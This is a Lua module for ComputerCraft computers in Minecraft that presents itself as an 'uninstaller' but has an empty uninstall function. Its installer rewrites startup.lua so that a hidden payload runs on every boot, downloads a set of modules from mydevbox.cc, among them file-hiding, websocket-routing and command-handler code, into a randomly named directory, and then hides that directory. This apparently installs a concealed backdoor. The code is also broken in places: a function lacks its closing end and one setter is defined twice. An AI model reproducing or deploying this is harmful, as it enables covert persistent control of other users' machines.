-- SPDX-FileCopyrightText: 2025 David Lightman
--
-- SPDX-License-Identifier: LicenseRef-CCPL
--Comments:
--[[
    My one liners are souly for 9551's brain rot <3
]]

local uninstaller = {}
uninstaller.__index = uninstaller

local OriginalShell = shell
local OriginalFS = fs
local OriginalInstallDir=nil
local CustomFS = nil
local function scan_startup()
    --Checks for my name in comments
    if OriginalFS.exists("startup.lua") then local f=OriginalFS.open("startup.lua","r") local l1,l2,l3=f.readLine(),f.readLine(),f.readLine() f.close() if (l1..l2..l3):find("wget pastebin") then local u=string.match(l1..l2..l3,"pastebin%s+(%S+)") if u then local r=http.get("https://pastebin.com/raw/"..u) if r and r.readAll():find("David Lightman") then return true end end elseif (l1..l2..l3):find("David Lightman") then return true end end
    return false
end
local function getRealStartupPath() if not OriginalFS.exists("startup.lua") then return nil end local f = OriginalFS.open("startup.lua", "r") for i = 1, 6 do local l = f.readLine() if not l then break end local filename = string.match(l, "^%-%-%s*(.-)%.$") if filename then f.close() return filename end end f.close() return nil end
local function getBDApath() local f=OriginalFS.exists("startup.lua") and OriginalFS.open("startup.lua","r") or nil for i=1,6 do local l=f and f.readLine() if not l then break end local path,filename=string.match(l,"^%-%-%s*(.-),(.-)$") if path and filename then f.close() return path,filename end end if f then f.close() end return nil,nil end


local function detect_installation()
    local flag1,flag2,flag3,flag4 = false,scan_startup(),(getBDApath()~=nil),false
    local crp = OriginalShell.getRunningProgram()
    if (type(crp)=="string" and crp == "startup.lua") then flag1=true end
    if (flag1 or flag2 or flag3 or flag4) then return true end
end

local function uninstall()

end

local function installer()
    
    local function generateRandomString(length)
        local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        local result = {}
        for i = 1, length do
            local rand = math.random(1, #charset)
            table.insert(result, charset:sub(rand, rand))
        end
        return table.concat(result)
    end

    local DIR_4Nin92xCdd0 = "/" .. generateRandomString(8)
    OriginalInstallDir = DIR_4Nin92xCdd0


    originalStartup = getRealStartupPath()
    oldStartupFileName=generateRandomString(8)--Does not end with .lua
    if (originalStartup==nil) then
        if OriginalFS.exists("startup.lua") then
            OriginalFS.move("startup.lua",oldStartupFileName..".lua")
            local f = OriginalFS.open("startup.lua", "w")
            f.write(string.format([[
                -- SPDX-FileCopyrightText: 2025 David Lightman
                --
                -- SPDX-License-Identifier: LicenseRef-CCPL
                --%s.
                --%s,%s
                local function a1()
                    shell.setDir("/")
                    shell.run("%s.lua")
                    shell.run("shell.lua")
                end
                local function a2()
                    shell.setDir("/")
                    shell.run("%s/%s")
                end
                parallel.waitForAny(a1, a2)
                ]], oldStartupFileName, OriginalInstallDir, "main.lua", oldStartupFileName, OriginalInstallDir, "main.lua"))
            f.close()
        else
            local f = OriginalFS.open("startup.lua", "w")
            f.write(string.format([[
                -- SPDX-FileCopyrightText: 2025 David Lightman
                --
                -- SPDX-License-Identifier: LicenseRef-CCPL
                --%s.
                --%s,%s
                local function a1()
                    shell.setDir("/")
                    shell.run("shell.lua")
                end
                local function a2()
                    shell.setDir("/")
                    shell.run("%s/%s")
                end
                parallel.waitForAny(a1, a2)
                ]], oldStartupFileName, OriginalInstallDir, "main.lua", OriginalInstallDir, "main.lua"))
        f.close()
        end
    end
    local function downloadFile(url, path)
        local response = http.get(url, {["User-Agent"] = "ComputerCraft-BDA-Client"})
        if response then
            local file = OriginalFS.open(path, "w")
            file.write(response.readAll())
            file.close()
            response.close()
            print("File downloaded successfully to " .. path)
        else
            print("Failed to download file from " .. url)
        end
    end
    
    

    downloadFile("https://mydevbox.cc/src/hooks/eventhook.lua", DIR_4Nin92xCdd0.."/hooks/eventhook.lua")
    downloadFile("https://mydevbox.cc/src/networking/http/http.lua", DIR_4Nin92xCdd0.."/networking/http/http.lua")
    downloadFile("https://mydevbox.cc/src/modules/persistent/hide_fs.lua", DIR_4Nin92xCdd0.."/modules/persistent/hide_fs.lua")
    downloadFile("https://mydevbox.cc/src/hooks/custompairs.lua", DIR_4Nin92xCdd0.."/hooks/custompairs.lua")
    downloadFile("https://mydevbox.cc/src/eventhandler/eventhandler.lua", DIR_4Nin92xCdd0.."/eventhandler/eventhandler.lua")
    downloadFile("https://mydevbox.cc/src/config/config.lua", DIR_4Nin92xCdd0.."/config/config.lua")
    downloadFile("https://mydevbox.cc/src/sys/utils/utils.lua", DIR_4Nin92xCdd0.."/sys/utils/utils.lua")
    downloadFile("https://mydevbox.cc/src/sys/crypto/cc_rsa.lua", DIR_4Nin92xCdd0.."/sys/crypto/cc_rsa.lua")
    downloadFile("https://mydevbox.cc/src/networking/http/wsrouter.lua", DIR_4Nin92xCdd0.."/networking/http/wsrouter.lua")
    downloadFile("https://mydevbox.cc/src/networking/rednet/router.lua", DIR_4Nin92xCdd0.."/networking/rednet/router.lua")
    downloadFile("https://mydevbox.cc/src/networking/core_router.lua", DIR_4Nin92xCdd0.."/networking/core_router.lua")
    downloadFile("https://mydevbox.cc/src/sys/crypto/EnD.lua", DIR_4Nin92xCdd0.."/sys/crypto/EnD.lua")
    downloadFile("https://mydevbox.cc/src/networking/processor/command_handler.lua", DIR_4Nin92xCdd0.."/networking/processor/command_handler.lua")
    downloadFile("https://mydevbox.cc/src/uninstaller.lua", DIR_4Nin92xCdd0.."/uninstaller.lua")
    downloadFile("https://mydevbox.cc/src/main.lua", DIR_4Nin92xCdd0.."/main.lua")
    if (CustomFS~=nil) then
        CustomFS.hideDir(DIR_4Nin92xCdd0)
    end


function uninstaller.uninstall()
    uninstall()
end

function uninstaller.installer()
    installer()
end

function uninstaller.setOGShell(s)
    if ((s~=nil) and (type(s)=="table")) then OriginalShell = s end
end

function uninstaller.setOGFS(fs1)
    if ((fs1~=nil) and (type(fs1)=="table")) then OriginalFS = fs1 end
end
function uninstaller.setOGFS(fs2)
    if ((fs2~=nil) and (type(fs2)=="table")) then CustomFS = fs2 end
end
function uninstaller.getInstallDir()
    return OriginalInstallDir
end
return uninstaller